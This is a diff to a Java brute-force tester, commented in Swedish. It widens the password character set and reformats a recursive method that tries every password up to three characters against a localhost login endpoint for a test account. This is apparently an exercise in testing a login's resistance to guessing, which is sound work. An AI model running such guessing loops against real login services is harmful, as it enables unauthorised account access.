@@ -30,7 +30,7 @@ public class BruteForceTester {
 
             String targetUrl = "http://localhost:8080/login"; // Serveradress och endpoint
             String targetUsername = "three@test.se"; // Användarnamn att testa
-            String characters = "0123456789"; // Tecken som kan ingå
+            String characters = "0123456789abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ"; // Tecken som kan ingå
             int maxLength = 3; // Maximal längd på lösenordet
 
             // Timing
@@ -65,7 +65,12 @@ public class BruteForceTester {
             return false;
         }
 
-        private static synchronized boolean bruteForceRecursive(String currentPassword, String characters, int length, String targetUsername, CloseableHttpClient httpClient, String targetUrl) throws Exception {
+        private static synchronized boolean bruteForceRecursive(String currentPassword,
+                                                                String characters,
+                                                                int length,
+                                                                String targetUsername,
+                                                                CloseableHttpClient httpClient,
+                                                                String targetUrl) throws Exception {
             if (length == 0) {
 
                 List<NameValuePair> params = new ArrayList<>();
@@ -81,12 +86,19 @@ public class BruteForceTester {
                     logger.info("Login successful for user: " + targetUsername + " with password: " + currentPassword);
                     return true;
                 }
-//                logger.info("Login failed for user: " + targetUsername + " with password: " + currentPassword); // kommentera ut om längre lösenord ska testas
+//                // kommentera ut om längre lösenord ska testas då alla lösenordskombinationer skrivs ut
+//                logger.info("Login failed for user: " + targetUsername + " with password: " + currentPassword);
+
                 return false;
             }
 
             for (char c : characters.toCharArray()) {
-                if (bruteForceRecursive(currentPassword + c, characters, length - 1, targetUsername, httpClient, targetUrl)) {
+                if (bruteForceRecursive(currentPassword + c,
+                        characters,
+                        length - 1,
+                        targetUsername,
+                        httpClient,
+                        targetUrl)) {
                     return true;
                 }
             }
